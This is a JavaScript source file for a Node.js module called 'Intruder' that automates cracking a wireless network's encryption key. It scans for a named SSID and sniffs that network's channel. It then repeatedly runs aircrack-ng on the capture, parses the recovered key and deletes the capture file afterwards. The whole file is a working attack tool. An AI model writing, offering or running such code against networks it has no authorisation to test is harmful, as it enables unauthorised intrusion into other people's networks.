
/**
 * Dependencies.
 */

var EventEmitter = require('events').EventEmitter;
var spawn = require('child_process').spawn;
var Scanner = require('network-scanner');
var Sniffer = require('network-sniffer');

/**
 * Expose `Intruder`.
 */

module.exports = Intruder;

/**
 * Initialize an `Intruder` with `options`.
 *
 * Options:
 *
 * 	- `interval` the time between crack attempts
 * 	- `channel` the network channel
 *
 * @param {Object} opts
 * @api public
 */

function Intruder(opts) {
  if (!(this instanceof Intruder)) return new Intruder(opts);
  EventEmitter.call(this);
  opts = opts || {};

  this.interval = opts.interval || 2000000;
  this.channel = opts.channel;
}

/**
 * Inherit from `EventEmitter.prototype`.
 */

Intruder.prototype = Object.create(EventEmitter.prototype);

/**
 * Crack the network by ssid.
 *
 * @param {String} ssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.crack = function(ssid, done) {
  var scanner = Scanner();
  var sniffer = Sniffer();
  var self = this;

  // scan for wireless networks
  scanner.scan(function(err, networks) {
    if (err) return done(err, null);

    // find network by ssid
    var network = find(ssid, networks);
    if (!network) return done(new Error('network not found'), null);

    // start sniffing the channel
    sniffer.start(network.channel, function(capture) {
      self.intervalId = setInterval(function() {
        self.decrypt(capture, network.bssid, done);
      }, self.interval);
    });

    // ensure wireless card does not get stuck in monitor mode
    process.on('exit', function() {
      sniffer.stop(network.channel);
    });
  });
};

/**
 * Decrypt the capture file.
 *
 * @param {String} capture
 * @param {String} bssid
 * @param {Function} done
 * @api public
 */

Intruder.prototype.decrypt = function(capture, bssid, done) {
  var args = ['-1', '-a', '1', '-b', bssid, capture];
  var self = this;

  var child = spawn('aircrack-ng', args);
  child.stdout.on('data', handleOut);
  child.stderr.on('data', handleErr);
  child.on('close', handleClose);

  function handleOut(buffer) {
    output = buffer.toString();
    if (!output) return child.kill();

    var results = parse(output);

    if (results.ivs) {
      self.emit('attempt', results.ivs);
    }

    if (results.key) {
      done(null, results.key);
      clearInterval(self.intervalId);
      spawn('rm', [capture]);
      child.kill();
    }
  }

  function handleErr(buffer) {
    error = buffer.toString();
  }

  function handleClose() {
    child.kill();
  }
};

/**
 * Find network with `ssid` in `networks`.
 *
 * @param {String} ssid
 * @param {Array} networks
 */

function find(ssid, networks) {
  var res;

  networks.forEach(function(network) {
    if (network.ssid === ssid) {
      res = network;
    }
  });

  return res;
}

/**
 * Parse output for the results.
 *
 * @param {String} output
 */

function parse(output) {
  var key = output.match(/KEY FOUND! \[ (.+) \]/);
  var ivs = output.match(/\(got (\d+) IVs\)/);
  var res = {};

  if (key) {
    res.key = key[1];
    return res;
  }

  if (ivs) {
    res.ivs = ivs[1];
  }

  return res;
}
